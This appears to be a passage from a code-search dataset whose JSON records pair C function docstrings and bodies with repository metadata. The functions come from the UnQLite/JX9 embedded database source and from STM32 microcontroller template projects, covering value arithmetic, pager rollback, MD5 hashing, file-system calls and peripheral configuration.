*/\n\t\t\tjx9HashmapExtractNodeKey(pEntry, &sKey);\n\t\t\tif( rc != SXRET_OK ){\n\t\t\t\t/* An error occured while invoking the supplied callback [i.e: not defined] */\n\t\t\t\tjx9_array_add_elem(pArray, &sKey, pValue); /* Keep the same value */\n\t\t\t}else{\n\t\t\t\t/* Insert the callback return value */\n\t\t\t\tjx9_array_add_elem(pArray, &sKey, &sResult);\n\t\t\t}\n\t\t\tjx9MemObjRelease(&sKey);\n\t\t\tjx9MemObjRelease(&sResult);\n\t\t}\n\t\t/* Point to the next entry */\n\t\tpEntry = pEntry->pPrev; /* Reverse link */\n\t}\n\tjx9_result_value(pCtx, pArray);\n\treturn JX9_OK;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * Try a get an integer representation of the given jx9_value.\n * If the jx9_value is not of type real, this function is a no-op.\n */\n", "func_signal": "JX9_PRIVATE sxi32 jx9MemObjTryInteger(jx9_value *pObj)", "code": "{\n\tif( pObj->iFlags & MEMOBJ_REAL ){\n\t\t/* Work only with reals */\n\t\tMemObjTryIntger(&(*pObj));\n\t}\n\treturn SXRET_OK;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n** If a write transaction is open, then all changes made within the \n** transaction are reverted and the current write-transaction is closed.\n** The pager falls back to PAGER_READER state if successful.\n**\n** Otherwise, in rollback mode, this function performs two functions:\n**\n**   1) It rolls back the journal file, restoring all database file and \n**      in-memory cache pages to the state they were in when the transaction\n**      was opened, and\n**\n**   2) It finalizes the journal file, so that it is not used for hot\n**      rollback at any point in the future (i.e. deletion).\n**\n** Finalization of the journal file (task 2) is only performed if the \n** rollback is successful.\n**\n*/\n", "func_signal": "UNQLITE_PRIVATE int unqlitePagerRollback(Pager *pPager,int bResetKvEngine)", "code": "{\n\tint rc = UNQLITE_OK;\n\tif( pPager->iState < PAGER_WRITER_LOCKED ){\n\t\t/* A write transaction must be opened */\n\t\treturn UNQLITE_OK;\n\t}\n\tif( pPager->is_mem ){\n\t\t/* As of this release 1.1.6: Transactions are not supported for in-memory databases */\n\t\treturn UNQLITE_OK;\n\t}\n\tif( pPager->is_rdonly ){\n\t\t/* Read-Only DB */\n\t\tunqliteGenError(pPager->pDb,\"Read-Only database\");\n\t\treturn UNQLITE_READ_ONLY;\n\t}\n\tif( pPager->iState >= PAGER_WRITER_CACHEMOD ){\n\t\tif( !pPager->no_jrnl ){\n\t\t\t/* Close any outstanding joural file */\n\t\t\tif( pPager->pjfd ){\n\t\t\t\t/* Sync the journal file */\n\t\t\t\tunqliteOsSync(pPager->pjfd,UNQLITE_SYNC_NORMAL);\n\t\t\t}\n\t\t\tunqliteOsCloseFree(pPager->pAllocator,pPager->pjfd);\n\t\t\tpPager->pjfd = 0;\n\t\t\tif( pPager->iFlags & (PAGER_CTRL_COMMIT_ERR|PAGER_CTRL_DIRTY_COMMIT) ){\n\t\t\t\t/* Perform the rollback */\n\t\t\t\trc = pager_journal_rollback(pPager,0);\n\t\t\t\tif( rc != UNQLITE_OK ){\n\t\t\t\t\t/* Set the auto-commit flag */\n\t\t\t\t\tpPager->pDb->iFlags |= UNQLITE_FL_DISABLE_AUTO_COMMIT;\n\t\t\t\t\treturn rc;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t/* Unlink the journal file */\n\t\tunqliteOsDelete(pPager->pVfs,pPager->zJournal,1);\n\t\t/* Reset the pager state */\n\t\trc = pager_reset_state(pPager,bResetKvEngine);\n\t\tif( rc != UNQLITE_OK ){\n\t\t\t/* Mostly an unlikely scenario */\n\t\t\tpPager->pDb->iFlags |= UNQLITE_FL_DISABLE_AUTO_COMMIT; /* Set the auto-commit flag */\n\t\t\tunqliteGenError(pPager->pDb,\"Error while reseting pager to its initial state\");\n\t\t\treturn rc;\n\t\t}\n\t}else{\n\t\t/* Downgrade to shared lock */\n\t\tpager_unlock_db(pPager,SHARED_LOCK);\n\t\tpPager->iState = PAGER_READER;\n\t}\n\treturn UNQLITE_OK;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * Update context to reflect the concatenation of another buffer full\n * of bytes.\n */\n", "func_signal": "JX9_PRIVATE void MD5Update(MD5Context *ctx, const unsigned char *buf, unsigned int len)", "code": "{\n\tsxu32 t;\n\n        /* Update bitcount */\n        t = ctx->bits[0];\n        if ((ctx->bits[0] = t + ((sxu32)len << 3)) < t)\n                ctx->bits[1]++; /* Carry from low to high */\n        ctx->bits[1] += len >> 29;\n        t = (t >> 3) & 0x3f;    /* Bytes already in shsInfo->data */\n        /* Handle any leading odd-sized chunks */\n        if ( t ) {\n                unsigned char *p = (unsigned char *)ctx->in + t;\n\n                t = 64-t;\n                if (len < t) {\n                        SyMemcpy(buf, p, len);\n                        return;\n                }\n                SyMemcpy(buf, p, t);\n                byteReverse(ctx->in, 16);\n                MD5Transform(ctx->buf, (sxu32*)ctx->in);\n                buf += t;\n                len -= t;\n        }\n        /* Process data in 64-byte chunks */\n        while (len >= 64) {\n                SyMemcpy(buf, ctx->in, 64);\n                byteReverse(ctx->in, 16);\n                MD5Transform(ctx->buf, (sxu32*)ctx->in);\n                buf += 64;\n                len -= 64;\n        }\n        /* Handle any remaining bytes of data.*/\n        SyMemcpy(buf, ctx->in, len);\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * Perform an addition operation of two jx9_values.\n * The reason this function is implemented here rather than 'vm.c'\n * is that the '+' operator is overloaded.\n * That is, the '+' operator is used for arithmetic operation and also \n * used for operation on arrays [i.e: union]. When used with an array \n * The + operator returns the right-hand array appended to the left-hand array.\n * For keys that exist in both arrays, the elements from the left-hand array\n * will be used, and the matching elements from the right-hand array will\n * be ignored.\n * This function take care of handling all the scenarios.\n */\n", "func_signal": "JX9_PRIVATE sxi32 jx9MemObjAdd(jx9_value *pObj1, jx9_value *pObj2, int bAddStore)", "code": "{\n\tif( ((pObj1->iFlags|pObj2->iFlags) & MEMOBJ_HASHMAP) == 0 ){\n\t\t\t/* Arithemtic operation */\n\t\t\tjx9MemObjToNumeric(pObj1);\n\t\t\tjx9MemObjToNumeric(pObj2);\n\t\t\tif( (pObj1->iFlags|pObj2->iFlags) & MEMOBJ_REAL ){\n\t\t\t\t/* Floating point arithmetic */\n\t\t\t\tjx9_real a, b;\n\t\t\t\tif( (pObj1->iFlags & MEMOBJ_REAL) == 0 ){\n\t\t\t\t\tjx9MemObjToReal(pObj1);\n\t\t\t\t}\n\t\t\t\tif( (pObj2->iFlags & MEMOBJ_REAL) == 0 ){\n\t\t\t\t\tjx9MemObjToReal(pObj2);\n\t\t\t\t}\n\t\t\t\ta = pObj1->x.rVal;\n\t\t\t\tb = pObj2->x.rVal;\n\t\t\t\tpObj1->x.rVal = a+b;\n\t\t\t\tMemObjSetType(pObj1, MEMOBJ_REAL);\n\t\t\t\t/* Try to get an integer representation also */\n\t\t\t\tMemObjTryIntger(&(*pObj1));\n\t\t\t}else{\n\t\t\t\t/* Integer arithmetic */\n\t\t\t\tsxi64 a, b;\n\t\t\t\ta = pObj1->x.iVal;\n\t\t\t\tb = pObj2->x.iVal;\n\t\t\t\tpObj1->x.iVal = a+b;\n\t\t\t\tMemObjSetType(pObj1, MEMOBJ_INT);\n\t\t\t}\n\t}else{\n\t\tif( (pObj1->iFlags|pObj2->iFlags) & MEMOBJ_HASHMAP ){\n\t\t\tjx9_hashmap *pMap;\n\t\t\tsxi32 rc;\n\t\t\tif( bAddStore ){\n\t\t\t\t/* Do not duplicate the hashmap, use the left one since its an add&store operation.\n\t\t\t\t */\n\t\t\t\tif( (pObj1->iFlags & MEMOBJ_HASHMAP) == 0 ){\t\t\t\t\n\t\t\t\t\t/* Force a hashmap cast */\n\t\t\t\t\trc = jx9MemObjToHashmap(pObj1);\n\t\t\t\t\tif( rc != SXRET_OK ){\n\t\t\t\t\t\tjx9VmThrowError(pObj1->pVm, 0, JX9_CTX_ERR, \"JX9 is running out of memory while creating array\");\n\t\t\t\t\t\treturn rc;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\t/* Point to the structure that describe the hashmap */\n\t\t\t\tpMap = (jx9_hashmap *)pObj1->x.pOther;\n\t\t\t}else{\n\t\t\t\t/* Create a new hashmap */\n\t\t\t\tpMap = jx9NewHashmap(pObj1->pVm, 0, 0);\n\t\t\t\tif( pMap == 0){\n\t\t\t\t\tjx9VmThrowError(pObj1->pVm, 0, JX9_CTX_ERR, \"JX9 is running out of memory while creating array\");\n\t\t\t\t\treturn SXERR_MEM;\n\t\t\t\t}\n\t\t\t}\n\t\t\tif( !bAddStore ){\n\t\t\t\tif(pObj1->iFlags & MEMOBJ_HASHMAP ){\n\t\t\t\t\t/* Perform a hashmap duplication */\n\t\t\t\t\tjx9HashmapDup((jx9_hashmap *)pObj1->x.pOther, pMap);\n\t\t\t\t}else{\n\t\t\t\t\tif((pObj1->iFlags & MEMOBJ_NULL) == 0 ){\n\t\t\t\t\t\t/* Simple insertion */\n\t\t\t\t\t\tjx9HashmapInsert(pMap, 0, pObj1);\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\t/* Perform the union */\n\t\t\tif(pObj2->iFlags & MEMOBJ_HASHMAP ){\n\t\t\t\tjx9HashmapUnion(pMap, (jx9_hashmap *)pObj2->x.pOther);\n\t\t\t}else{\n\t\t\t\tif((pObj2->iFlags & MEMOBJ_NULL) == 0 ){\n\t\t\t\t\t/* Simple insertion */\n\t\t\t\t\tjx9HashmapInsert(pMap, 0, pObj2);\n\t\t\t\t}\n\t\t\t}\n\t\t\t/* Reflect the change */\n\t\t\tif( pObj1->iFlags & MEMOBJ_STRING ){\n\t\t\t\tSyBlobRelease(&pObj1->sBlob);\n\t\t\t}\n\t\t\tpObj1->x.pOther = pMap;\n\t\t\tMemObjSetType(pObj1, MEMOBJ_HASHMAP);\n\t\t}\n\t}\n\treturn SXRET_OK;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * Read the unqlite header (first page). (Big-Endian)\n */\n", "func_signal": "static int pager_extract_header(Pager *pPager,const unsigned char *zRaw,sxu32 nByte)", "code": "{\n\tconst unsigned char *zEnd = &zRaw[nByte];\n\tsxu32 nDos,iMagic;\n\tsxu16 nLen;\n\tchar *zKv;\n\t/* Database signature */\n\tif( SyMemcmp(UNQLITE_DB_SIG,zRaw,sizeof(UNQLITE_DB_SIG)-1) != 0 ){\n\t\t/* Corrupt database */\n\t\treturn UNQLITE_CORRUPT;\n\t}\n\tzRaw += sizeof(UNQLITE_DB_SIG)-1;\n\t/* Database magic number */\n\tSyBigEndianUnpack32(zRaw,&iMagic);\n\tzRaw += 4; /* 4 byte magic number */\n\tif( iMagic != UNQLITE_DB_MAGIC ){\n\t\t/* Corrupt database */\n\t\treturn UNQLITE_CORRUPT;\n\t}\n\t/* Database creation time */\n\tSyBigEndianUnpack32(zRaw,&nDos);\n\tzRaw += 4; /* 4 byte DOS time format */\n\tSyDosTimeFormat(nDos,&pPager->tmCreate);\n\t/* Sector size */\n\tSyBigEndianUnpack32(zRaw,(sxu32 *)&pPager->iSectorSize);\n\tzRaw += 4; /* 4 byte sector size */\n\t/* Page size */\n\tSyBigEndianUnpack32(zRaw,(sxu32 *)&pPager->iPageSize);\n\tzRaw += 4; /* 4 byte page size */\n\t/* Check that the values read from the page-size and sector-size fields\n    ** are within range. To be 'in range', both values need to be a power\n    ** of two greater than or equal to 512 or 32, and not greater than their \n    ** respective compile time maximum limits.\n    */\n    if( pPager->iPageSize<UNQLITE_MIN_PAGE_SIZE || pPager->iSectorSize<32\n     || pPager->iPageSize>UNQLITE_MAX_PAGE_SIZE || pPager->iSectorSize>MAX_SECTOR_SIZE\n     || ((pPager->iPageSize<-1)&pPager->iPageSize)!=0    || ((pPager->iSectorSize-1)&pPager->iSectorSize)!=0 \n    ){\n      return UNQLITE_CORRUPT;\n\t}\n\t/* Key value storage engine */\n\tSyBigEndianUnpack16(zRaw,&nLen); /* 2 byte storage engine length */\n\tzRaw += 2;\n\tif( nLen > (sxu16)(zEnd - zRaw) ){\n\t\tnLen = (sxu16)(zEnd - zRaw);\n\t}\n\tzKv = (char *)SyMemBackendDup(pPager->pAllocator,(const char *)zRaw,nLen);\n\tif( zKv == 0 ){\n\t\treturn UNQLITE_NOMEM;\n\t}\n\tSyStringInitFromBuf(&pPager->sKv,zKv,nLen);\n\treturn UNQLITE_OK;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/* int (*xChgrp)(const char *, const char *) */\n", "func_signal": "static int UnixVfs_Chgrp(const char *zPath, const char *zGroup)", "code": "{\n#ifndef JX9_UNIX_STATIC_BUILD\n  struct group *group;\n  gid_t gid;\n  int rc;\n  group = getgrnam(zGroup);\n  if (group == 0) {\n    return -1;\n  }\n  gid = group->gr_gid;\n  rc = chown(zPath, -1, gid);\n  return rc == 0 ? JX9_OK : -1;\n#else\n\tSXUNUSED(zPath);\n\tSXUNUSED(zGroup);\n\treturn -1;\n#endif /* JX9_UNIX_STATIC_BUILD */\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * bool is_executable(string $filename)\n *  Tells whether the filename is executable.\n * Parameters\n *  $filename\n *   Path to the file.\n * Return\n *  TRUE on success or FALSE on failure.\n */\n", "func_signal": "static int jx9Vfs_is_executable(jx9_context *pCtx, int nArg, jx9_value **apArg)", "code": "{\n\tconst char *zPath;\n\tjx9_vfs *pVfs;\n\tint rc;\n\tif( nArg < 1 || !jx9_value_is_string(apArg[0]) ){\n\t\t/* Missing/Invalid argument, return FALSE */\n\t\tjx9_result_bool(pCtx, 0);\n\t\treturn JX9_OK;\n\t}\n\t/* Point to the underlying vfs */\n\tpVfs = (jx9_vfs *)jx9_context_user_data(pCtx);\n\tif( pVfs == 0 || pVfs->xExecutable == 0 ){\n\t\t/* IO routine not implemented, return NULL */\n\t\tjx9_context_throw_error_format(pCtx, JX9_CTX_WARNING, \n\t\t\t\"IO routine(%s) not implemented in the underlying VFS, JX9 is returning FALSE\", \n\t\t\tjx9_function_name(pCtx)\n\t\t\t);\n\t\tjx9_result_bool(pCtx, 0);\n\t\treturn JX9_OK;\n\t}\n\t/* Point to the desired directory */\n\tzPath = jx9_value_to_string(apArg[0], 0);\n\t/* Perform the requested operation */\n\trc = pVfs->xExecutable(zPath);\n\t/* IO return value */\n\tjx9_result_bool(pCtx, rc == JX9_OK);\n\treturn JX9_OK;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * Set a cache limit. Note that, this is a simple hint, the pager is not\n * forced to honor this limit.\n */\n", "func_signal": "UNQLITE_PRIVATE int unqlitePagerSetCachesize(Pager *pPager,int mxPage)", "code": "{\n\tif( mxPage < 256 ){\n\t\treturn UNQLITE_INVALID;\n\t}\n\tpPager->nCacheMax = mxPage;\n\treturn UNQLITE_OK;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * int vsprintf(string $format, array $args)\n *  Output a formatted string.\n * Parameters\n *  $format\n *   See sprintf() for a description of format.\n * Return\n *  A string produced according to the formatting string format.\n */\n", "func_signal": "static int jx9Builtin_vsprintf(jx9_context *pCtx, int nArg, jx9_value **apArg)", "code": "{\n\tconst char *zFormat;\n\tjx9_hashmap *pMap;\n\tSySet sArg;\n\tint nLen, n;\n\tif( nArg < 2 || !jx9_value_is_string(apArg[0]) || !jx9_value_is_json_array(apArg[1]) ){\n\t\t/* Missing/Invalid arguments, return the empty string */\n\t\tjx9_result_string(pCtx, \"\", 0);\n\t\treturn JX9_OK;\n\t}\n\t/* Extract the string format */\n\tzFormat = jx9_value_to_string(apArg[0], &nLen);\n\tif( nLen < 1 ){\n\t\t/* Empty string */\n\t\tjx9_result_string(pCtx, \"\", 0);\n\t\treturn JX9_OK;\n\t}\n\t/* Point to hashmap */\n\tpMap = (jx9_hashmap *)apArg[1]->x.pOther;\n\t/* Extract arguments from the hashmap */\n\tn = jx9HashmapValuesToSet(pMap, &sArg);\n\t/* Format the string */\n\tjx9InputFormat(sprintfConsumer, pCtx, zFormat, nLen, n, (jx9_value **)SySetBasePtr(&sArg), 0, TRUE);\n\t/* Release the container */\n\tSySetRelease(&sArg);\n\treturn JX9_OK;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * [CAPIREF: unqlite_kv_cursor_prev_entry()]\n * Please refer to the official documentation for function purpose and expected parameters.\n */\n", "func_signal": "int unqlite_kv_cursor_prev_entry(unqlite_kv_cursor *pCursor)", "code": "{\n\tint rc;\n#ifdef UNTRUST\n\tif( pCursor == 0 ){\n\t\treturn UNQLITE_CORRUPT;\n\t}\n#endif\n\t/* Check if the requested method is implemented by the underlying storage engine */\n\tif( pCursor->pStore->pIo->pMethods->xPrev == 0 ){\n\t\trc = UNQLITE_NOTIMPLEMENTED;\n\t}else{\n\t\t/* Seek to the previous entry */\n\t\trc = pCursor->pStore->pIo->pMethods->xPrev(pCursor);\n\t}\n\treturn rc;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * Remove a cell and its paylod (key + data).\n */\n", "func_signal": "static int lhRecordRemove(lhcell *pCell)", "code": "{\n\tlhash_kv_engine *pEngine = pCell->pPage->pHash;\n\tint rc;\n\tif( pCell->iOvfl > 0){\n\t\t/* Discard overflow pages */\n\t\tunqlite_page *pOvfl;\n\t\tpgno iNext = pCell->iOvfl;\n\t\tfor(;;){\n\t\t\t/* Point to the overflow page */\n\t\t\trc = pEngine->pIo->xGet(pEngine->pIo->pHandle,iNext,&pOvfl);\n\t\t\tif( rc != UNQLITE_OK ){\n\t\t\t\treturn rc;\n\t\t\t}\n\t\t\t/* Next page on the chain */\n\t\t\tSyBigEndianUnpack64(pOvfl->zData,&iNext);\n\t\t\t/* Restore the page to the free list */\n\t\t\trc = lhRestorePage(pEngine,pOvfl);\n\t\t\tif( rc != UNQLITE_OK ){\n\t\t\t\treturn rc;\n\t\t\t}\n\t\t\t/* Unref */\n\t\t\tpEngine->pIo->xPageUnref(pOvfl);\n\t\t\tif( iNext == 0 ){\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\t/* Unlink the cell */\n\trc = lhUnlinkCell(pCell);\n\treturn rc;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * Link a foreign variable with the TOP most active frame.\n * Refer to the JX9_OP_UPLINK instruction implementation for more\n * information.\n */\n", "func_signal": "static sxi32 VmFrameLink(jx9_vm *pVm,SyString *pName)", "code": "{\n\tVmFrame *pTarget, *pFrame;\n\tSyHashEntry *pEntry = 0;\n\tsxi32 rc;\n\t/* Point to the upper frame */\n\tpFrame = pVm->pFrame;\n\tpTarget = pFrame;\n\tpFrame = pTarget->pParent;\n\twhile( pFrame ){\n\t\t/* Query the current frame */\n\t\tpEntry = SyHashGet(&pFrame->hVar, (const void *)pName->zString, pName->nByte);\n\t\tif( pEntry ){\n\t\t\t/* Variable found */\n\t\t\tbreak;\n\t\t}\t\t\n\t\t/* Point to the upper frame */\n\t\tpFrame = pFrame->pParent;\n\t}\n\tif( pEntry == 0 ){\n\t\t/* Inexistant variable */\n\t\treturn SXERR_NOTFOUND;\n\t}\n\t/* Link to the current frame */\n\trc = SyHashInsert(&pTarget->hVar, pEntry->pKey, pEntry->nKeyLen, pEntry->pUserData);\n\treturn rc;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * GLOB_NOSORT\n *  Expand 0x02 (must be a power of two)\n */\n", "func_signal": "static void JX9_GLOB_NOSORT_Const(jx9_value *pVal, void *pUserData)", "code": "{\n\tSXUNUSED(pUserData); /* cc warning */\n\tjx9_value_int(pVal, 0x02);\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n * Allocate, initialize and register a new KV storage engine\n * within this database instance.\n */\n", "func_signal": "UNQLITE_PRIVATE int unqlitePagerRegisterKvEngine(Pager *pPager,unqlite_kv_methods *pMethods)", "code": "{\n\tunqlite_db *pStorage = &pPager->pDb->sDB;\n\tunqlite *pDb = pPager->pDb;\n\tunqlite_kv_engine *pEngine;\n\tunqlite_kv_io *pIo;\n\tsxu32 nByte;\n\tint rc;\n\tif( pPager->pEngine ){\n\t\tif( pMethods == pPager->pEngine->pIo->pMethods ){\n\t\t\t/* Ticket 1432: Same implementation */\n\t\t\treturn UNQLITE_OK;\n\t\t}\n\t\t/* Release the old KV engine */\n\t\tpager_release_kv_engine(pPager);\n\t}\n\t/* Allocate a new KV engine instance */\n\tnByte = (sxu32)pMethods->szKv;\n\tpEngine = (unqlite_kv_engine *)SyMemBackendAlloc(&pDb->sMem,nByte);\n\tif( pEngine == 0 ){\n\t\tunqliteGenOutofMem(pDb);\n\t\treturn UNQLITE_NOMEM;\n\t}\n\tpIo = (unqlite_kv_io *)SyMemBackendAlloc(&pDb->sMem,sizeof(unqlite_kv_io));\n\tif( pIo == 0 ){\n\t\tSyMemBackendFree(&pDb->sMem,pEngine);\n\t\tunqliteGenOutofMem(pDb);\n\t\treturn UNQLITE_NOMEM;\n\t}\n\t/* Zero the structure */\n\tSyZero(pIo,sizeof(unqlite_io_methods));\n\tSyZero(pEngine,nByte);\n\t/* Populate the IO structure */\n\tpager_kv_io_init(pPager,pMethods,pIo);\n\tpEngine->pIo = pIo;\n\t/* Invoke the init callback if avaialble */\n\tif( pMethods->xInit ){\n\t\trc = pMethods->xInit(pEngine,unqliteGetPageSize());\n\t\tif( rc != UNQLITE_OK ){\n\t\t\tunqliteGenErrorFormat(pDb,\n\t\t\t\t\"xInit() method of the underlying KV engine '%z' failed\",&pPager->sKv);\n\t\t\tgoto fail;\n\t\t}\n\t\tpEngine->pIo = pIo;\n\t}\n\tpPager->pEngine = pEngine;\n\t/* Allocate a new cursor */\n\trc = unqliteInitCursor(pDb,&pStorage->pCursor);\n\tif( rc != UNQLITE_OK ){\n\t\tgoto fail;\n\t}\n\treturn UNQLITE_OK;\nfail:\n\tSyMemBackendFree(&pDb->sMem,pEngine);\n\tSyMemBackendFree(&pDb->sMem,pIo);\n\treturn rc;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/*\n** Unlock the database file to level eLock, which must be either NO_LOCK\n** or SHARED_LOCK. Regardless of whether or not the call to xUnlock()\n** succeeds, set the Pager.iLock variable to match the (attempted) new lock.\n**\n** Except, if Pager.iLock is set to NO_LOCK when this function is\n** called, do not modify it. See the comment above the #define of \n** NO_LOCK for an explanation of this.\n*/\n", "func_signal": "static int pager_unlock_db(Pager *pPager, int eLock)", "code": "{\n  int rc = UNQLITE_OK;\n  if( pPager->iLock != NO_LOCK ){\n    rc = unqliteOsUnlock(pPager->pfd,eLock);\n    pPager->iLock = eLock;\n  }\n  return rc;\n}", "path": "src\\unqlitego\\unqlite.c", "repo_name": "xjdrew/redis-persist", "stars": 72, "license": "None", "language": "c", "size": 895}
{"docstring": "/**\n  * @brief  This function handles Memory Manage exception.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "void MemManage_Handler(void)", "code": "{\n  /* Go to infinite loop when Memory Manage exception occurs */\n  while (1)\n  {\n  }\n}", "path": "stm32vl-discovery\\src\\stm32f10x_it.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Selects the condition for the system to enter low power mode.\n  * @param  LowPowerMode: Specifies the new mode for the system to enter low power mode.\n  *   This parameter can be one of the following values:\n  *     @arg NVIC_LP_SEVONPEND\n  *     @arg NVIC_LP_SLEEPDEEP\n  *     @arg NVIC_LP_SLEEPONEXIT\n  * @param  NewState: new state of LP condition. This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void NVIC_SystemLPConfig(uint8_t LowPowerMode, FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_NVIC_LP(LowPowerMode));\n  assert_param(IS_FUNCTIONAL_STATE(NewState));  \n  \n  if (NewState != DISABLE)\n  {\n    SCB->SCR |= LowPowerMode;\n  }\n  else\n  {\n    SCB->SCR &= (uint32_t)(~(uint32_t)LowPowerMode);\n  }\n}", "path": "stm32vl-discovery\\lib\\src\\peripherals\\misc.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Configures the SysTick clock source.\n  * @param  SysTick_CLKSource: specifies the SysTick clock source.\n  *   This parameter can be one of the following values:\n  *     @arg SysTick_CLKSource_HCLK_Div8: AHB clock divided by 8 selected as SysTick clock source.\n  *     @arg SysTick_CLKSource_HCLK: AHB clock selected as SysTick clock source.\n  * @retval None\n  */\n", "func_signal": "void SysTick_CLKSourceConfig(uint32_t SysTick_CLKSource)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_SYSTICK_CLK_SOURCE(SysTick_CLKSource));\n  if (SysTick_CLKSource == SysTick_CLKSource_HCLK)\n  {\n    SysTick->CTRL |= SysTick_CLKSource_HCLK;\n  }\n  else\n  {\n    SysTick->CTRL &= SysTick_CLKSource_HCLK_Div8;\n  }\n}", "path": "stm32vl-discovery\\lib\\src\\peripherals\\misc.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  Initializes the CRYP peripheral according to the specified parameters\n  *         in the CRYP_InitStruct.\n  * @param  CRYP_InitStruct: pointer to a CRYP_InitTypeDef structure that contains\n  *         the configuration information for the CRYP peripheral.\n  * @retval None\n  */\n", "func_signal": "void CRYP_Init(CRYP_InitTypeDef* CRYP_InitStruct)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_CRYP_ALGOMODE(CRYP_InitStruct->CRYP_AlgoMode));\n  assert_param(IS_CRYP_DATATYPE(CRYP_InitStruct->CRYP_DataType));\n  assert_param(IS_CRYP_ALGODIR(CRYP_InitStruct->CRYP_AlgoDir));\n\n  /* Select Algorithm mode*/  \n  CRYP->CR &= ~CRYP_CR_ALGOMODE;\n  CRYP->CR |= CRYP_InitStruct->CRYP_AlgoMode;\n\n  /* Select dataType */ \n  CRYP->CR &= ~CRYP_CR_DATATYPE;\n  CRYP->CR |= CRYP_InitStruct->CRYP_DataType;\n\n  /* select Key size (used only with AES algorithm) */\n  if ((CRYP_InitStruct->CRYP_AlgoMode == CRYP_AlgoMode_AES_ECB) ||\n      (CRYP_InitStruct->CRYP_AlgoMode == CRYP_AlgoMode_AES_CBC) ||\n      (CRYP_InitStruct->CRYP_AlgoMode == CRYP_AlgoMode_AES_CTR) ||\n      (CRYP_InitStruct->CRYP_AlgoMode == CRYP_AlgoMode_AES_Key))\n  {\n    assert_param(IS_CRYP_KEYSIZE(CRYP_InitStruct->CRYP_KeySize));\n    CRYP->CR &= ~CRYP_CR_KEYSIZE;\n    CRYP->CR |= CRYP_InitStruct->CRYP_KeySize; /* Key size and value must be \n                                                  configured once the key has \n                                                  been prepared */\n  }\n\n  /* Select data Direction */ \n  CRYP->CR &= ~CRYP_CR_ALGODIR;\n  CRYP->CR |= CRYP_InitStruct->CRYP_AlgoDir;\n}", "path": "stm32f4-discovery\\lib\\src\\peripherals\\stm32f4xx_cryp.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
{"docstring": "/**\n  * @brief  This function handles Usage Fault exception.\n  * @param  None\n  * @retval None\n  */\n", "func_signal": "void UsageFault_Handler(void)", "code": "{\n  /* Go to infinite loop when Usage Fault exception occurs */\n  while (1)\n  {\n  }\n}", "path": "stm32vl-discovery\\src\\stm32f10x_it.c", "repo_name": "jeremyherbert/stm32-templates", "stars": 66, "license": "None", "language": "c", "size": 765}
